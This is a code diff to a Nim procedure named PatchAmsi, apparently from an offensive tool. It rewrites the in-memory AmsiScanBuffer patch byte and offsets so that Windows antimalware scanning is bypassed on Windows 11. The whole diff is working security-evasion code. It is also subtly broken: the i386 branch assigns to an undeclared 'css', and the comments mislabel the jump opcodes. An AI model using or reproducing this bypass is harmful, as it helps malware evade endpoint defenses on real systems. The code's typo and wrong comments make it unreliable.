@@ -334,9 +334,9 @@ proc PatchAmsi(): bool =
         disabled: bool = false
     
     when defined amd64:
-        let patch: array[1, byte] = [byte 0x74] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
+        let patch: array[1, byte] = [byte 0x75] # Patch to JNZ, old value was 0x74 (JNZ)
     elif defined i386:
-        let patch: array[1, byte] = [byte 0x74] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
+        let patch: array[1, byte] = [byte 0x75]
     
     when defined(DInvoke):
         amsi = MyLoadLibraryA(obf("amsi.dll"))
@@ -356,9 +356,11 @@ proc PatchAmsi(): bool =
             echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
         return disabled
     when defined amd64:
-        cs = cs + 0x83 # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
+        cs = cs + 0x6D # Since Win11, there is no more JNZ, but JZ So we're going to patch the JZ to JNZ
+        #cs = cs + 0x83 # Old value for Win10 to change JNZ to JZ. Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
     else:
-        cs = cs + 0x75
+        #cs = cs + 0x75 # old value
+        css = cs + 0x47 # Since Win11, there is no more JNZ, but JZ So we're going to patch the JZ to JNZ
     var oldProtection: DWORD = 0
     var success: BOOL
     var protectAddress = cs
